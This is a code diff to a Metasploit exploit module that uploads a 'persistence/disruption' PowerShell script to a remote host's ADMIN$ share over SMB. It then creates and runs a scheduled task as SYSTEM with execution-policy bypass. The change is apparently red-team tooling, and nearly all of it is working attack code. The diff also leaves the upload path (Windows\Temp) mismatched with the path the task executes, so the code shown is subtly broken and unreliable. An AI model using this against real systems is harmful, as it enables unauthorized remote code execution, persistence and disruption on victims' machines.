@@ -152,15 +152,18 @@ class MetasploitModule < Msf::Exploit::Remote
 
       # === CORRECT UPLOAD BLOCK FOR METASPLOIT 6.4+ (RubySMB) ===
       print_status("Uploading persistence/disruption script to ADMIN$ share...")
-      share_unc = "\\\\#{rhost}\\ADMIN$"
-      simple.connect(share_unc)
+      share = "\\\\#{rhost}\\ADMIN$"
+      simple.connect(share)
+      tree = simple.client.tree_connect(share)
 
-      remote_path = "\\Windows\\redteam_persistence.ps1"
-      fd = smb_open(remote_path, 'rwct', write: true)
-      fd << persistence_script
-      fd.close
+      file_path = "Windows\\Temp\\redteam_persistence.ps1"
+      file = tree.open_file(filename: file_path,
+                            write: true,
+                            disposition: RubySMB::Dispositions::FILE_OPEN_IF)
+      file.write(data: persistence_script)
+      file.close
 
-      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\ADMIN$#{remote_path}")
+      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\ADMIN$\\#{file_path}")
 
       # Execute the script immediately via scheduled task
       exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
